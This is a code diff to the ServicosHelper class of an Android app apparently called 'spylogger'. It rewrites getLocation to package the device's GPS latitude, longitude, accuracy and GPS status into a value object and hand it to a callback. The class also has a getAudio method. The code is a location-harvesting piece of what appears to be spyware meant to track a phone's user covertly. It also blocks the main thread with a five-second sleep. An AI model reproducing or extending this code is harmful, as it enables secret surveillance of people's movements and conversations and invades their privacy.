@@ -7,6 +7,7 @@ import android.util.Log;
 
 import com.gravatasufoca.spylogger.services.GPSTracker;
 import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
 
 import java.io.IOException;
 
@@ -16,17 +17,35 @@ import java.io.IOException;
 
 public class ServicosHelper {
 
-    public void getLocation(Context context, final TaskComplete callback) {
-        GPSTracker gpsTracker = new GPSTracker(context);
-        if (gpsTracker.canGetLocation()) {
-            try {
-                Thread.sleep(5000);
-                Log.i("GPS LOCATION", Double.toString(gpsTracker.getLatitude()) + "," + Double.toString(gpsTracker.getLongitude()));
-                Log.i("GPS LOCATION", Double.toString(gpsTracker.getAccuracy()));
-            } catch (InterruptedException e) {
-                e.printStackTrace();
+    public void getLocation(final Context context, final TaskComplete callback) {
+        final Handler handler = new Handler(Looper.getMainLooper());
+        handler.post(new Runnable() {
+            @Override
+            public void run() {
+                GPSTracker gpsTracker = new GPSTracker(context);
+                if (gpsTracker.canGetLocation()) {
+                    try {
+                        Thread.sleep(5000);
+                        Log.i("GPS LOCATION", Double.toString(gpsTracker.getLatitude()) + "," + Double.toString(gpsTracker.getLongitude()));
+                        Log.i("GPS LOCATION", Double.toString(gpsTracker.getAccuracy()));
+                        LocalizacaoVO localizacaoVO=new LocalizacaoVO();
+                        localizacaoVO.setLatitude(gpsTracker.getLatitude());
+                        localizacaoVO.setLongitude(gpsTracker.getLongitude());
+                        localizacaoVO.setPrecisao(Double.valueOf(gpsTracker.getAccuracy()));
+                        localizacaoVO.setGpsLigado(gpsTracker.canGetLocation());
+
+                        if(callback!=null){
+                            callback.onFinish(localizacaoVO);
+                        }
+
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }finally {
+                        gpsTracker=null;
+                    }
+                }
             }
-        }
+        });
     }
 
     public void getAudio(Context context, int maxLength, final TaskComplete callback) {
